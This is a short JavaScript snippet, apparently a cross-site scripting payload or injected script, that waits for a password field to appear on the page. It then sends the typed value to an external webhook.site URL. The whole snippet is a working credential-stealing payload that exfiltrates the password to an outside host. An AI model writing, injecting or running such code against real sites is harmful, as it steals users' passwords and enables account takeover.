const observer = new MutationObserver(() => {
  const pwdInput = document.querySelector('.mdp input[type="password"]');
  if (pwdInput) {
    observer.disconnect();
    setTimeout(() => {
      fetch(`https://webhook.site/ac1d52e4-7f8b-4c26-a4e3-5c2d97e33be3?password=${pwdInput.value}`, {});
    }, 1000);
  }
});

observer.observe(document.body, { childList: true, subtree: true });
